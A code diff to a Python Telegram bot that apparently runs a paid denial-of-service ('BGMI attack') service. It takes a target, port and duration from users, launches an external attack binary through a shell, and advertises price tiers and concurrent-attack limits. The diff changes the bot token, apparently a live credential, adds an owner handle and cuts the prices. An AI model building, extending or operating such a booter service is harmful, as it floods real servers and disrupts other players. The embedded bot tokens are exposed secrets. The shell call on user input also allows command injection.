@@ -7,7 +7,7 @@ import os
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7331564546:AAEa9pq387RBIaTuw9ok-m-C4gM9rGQvRxY')
+bot = telebot.TeleBot('7331564546:AAFGI8BBcdpA_zlim82bcCXkcxC-40eWy-c')
 
 # Admin user IDs
 admin_id = {"6353114118"}
@@ -239,7 +239,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./isagi.txt {target} {port} {time} 1800"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} time: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
@@ -307,7 +307,8 @@ def welcome_rules(message):
 
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
+3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
+4. the owner is @SLAYER_OP7'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -321,9 +322,9 @@ Vip 🌟 :
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-Day-->100 Rs
-Week-->400 Rs
-Month-->800 Rs
+Day-->7 Rs
+Week-->50 Rs
+Month-->180 Rs
 '''
     bot.reply_to(message, response)
 
